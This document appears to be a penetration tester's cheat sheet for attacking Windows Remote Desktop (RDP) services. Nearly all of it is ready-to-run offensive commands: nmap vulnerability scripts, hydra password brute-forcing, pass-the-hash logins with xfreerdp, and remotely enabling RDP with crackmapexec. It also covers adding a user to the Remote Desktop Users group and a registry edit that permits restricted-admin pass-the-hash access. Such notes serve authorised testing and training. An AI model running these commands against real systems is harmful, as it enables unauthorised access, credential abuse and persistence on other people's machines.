## Enumeration 
### nmap 
```bash
# nmap default scripts
nmap -sV -sC <IP> -p3389 --script rdp*
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```

### rdp-sec-check
```bash 
# checks security settings for RDP (unauthenticated scan)
./rdp-sec-check.pl <IP>
```

### bruteforcing RDP 
```bash
# hydra 
hydra -L users.txt -p 'Password1' <IP> rdp
hydra -L user.list -P password.list rdp://IP
```

### connect with credentials 
```bash
# rdesktop 
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>

# xfreerdp 
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
xfreerdp /u:student /p:lab /v:192.168.209.152 +home-drive  # share kali home drive to transfer tools

# crackmapexec 
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp -o ACTION=enable
cme rdp <target> -u <u> -p <p>
```

### add user to RDP group 
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```

### enable RDP (disable restrictedadmin) 
```bash
# enable RDP as admin 
reg.exe add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# login via RDP 
sudo xfreerdp /v:192.168.154.141 /u:sqlsvc /p:'dsf89dsf4fsSS' /size:1700x1160
```
